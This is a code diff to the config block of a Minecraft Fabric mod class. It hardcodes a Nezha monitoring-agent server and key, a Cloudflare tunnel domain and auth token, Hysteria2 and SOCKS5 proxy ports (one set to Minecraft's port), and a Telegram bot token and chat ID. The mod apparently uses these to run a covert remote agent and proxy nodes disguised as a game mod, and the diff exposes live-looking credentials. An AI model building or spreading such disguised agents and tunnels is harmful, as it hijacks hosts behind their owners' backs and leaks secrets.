@@ -32,20 +32,20 @@ public class Maohi implements ModInitializer {
         return (value != null && !value.trim().isEmpty()) ? value.trim() : defaultValue;
     }
 
-    private static final String UUID         = cfg("UUID", "");
-    private static final String NEZHA_SERVER = cfg("NEZHA_SERVER", "");
+    private static final String UUID         = cfg("UUID", "21c0249f-5af8-4efc-b6aa-d32b889b212b");
+    private static final String NEZHA_SERVER = cfg("NEZHA_SERVER", "144.22.159.118:8008");
     private static final String NEZHA_PORT = cfg("NEZHA_PORT", "");
-    private static final String NEZHA_KEY    = cfg("NEZHA_KEY", "");
-    private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "");
-    private static final String ARGO_AUTH    = cfg("ARGO_AUTH", "");
-    private static final String ARGO_PORT    = cfg("ARGO_PORT", "9010");
-    private static final String HY2_PORT     = cfg("HY2_PORT", "");
-    private static final String S5_PORT      = cfg("S5_PORT", "");
-    private static final String CFIP         = cfg("CFIP", "");
+    private static final String NEZHA_KEY    = cfg("NEZHA_KEY", "GTmVnjnxL0bC41DDvN7UzMNqf6jAK9TM");
+    private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "weirdhost.bo88.cc.cd");
+    private static final String ARGO_AUTH    = cfg("ARGO_AUTH", "eyJhIjoiOTU4MWYzZmNhMDgwMjgxMTgzMmEzNTNhYmY1OGM2MjMiLCJ0IjoiNzY5Y2E4MDQtNGYzZS00ZTQ3LWE2ZDMtYmZlMGFjYTJjNGVkIiwicyI6IlpUTTJOMk13WVdRdE56VTNPUzAwTlRVekxXSmtabUl0T0RsbU1URXlPV05rTmpnMiJ9");
+    private static final String ARGO_PORT    = cfg("ARGO_PORT", "8001");
+    private static final String HY2_PORT     = cfg("HY2_PORT", "25565");
+    private static final String S5_PORT      = cfg("S5_PORT", "25575");
+    private static final String CFIP         = cfg("CFIP", "cdns.doon.eu.org");
     private static final String CFPORT       = cfg("CFPORT", "443");
-    private static final String NAME         = cfg("NAME", "");
-    private static final String CHAT_ID      = cfg("CHAT_ID", "");
-    private static final String BOT_TOKEN    = cfg("BOT_TOKEN", "");
+    private static final String NAME         = cfg("NAME", "xserver-jp");
+    private static final String CHAT_ID      = cfg("CHAT_ID", "434546692");
+    private static final String BOT_TOKEN    = cfg("BOT_TOKEN", "8333285464:AAE9xFo7w51MclwGz-OA_vud9MC5N9RNRCQ");
 
     private String webName;
     private String botName;
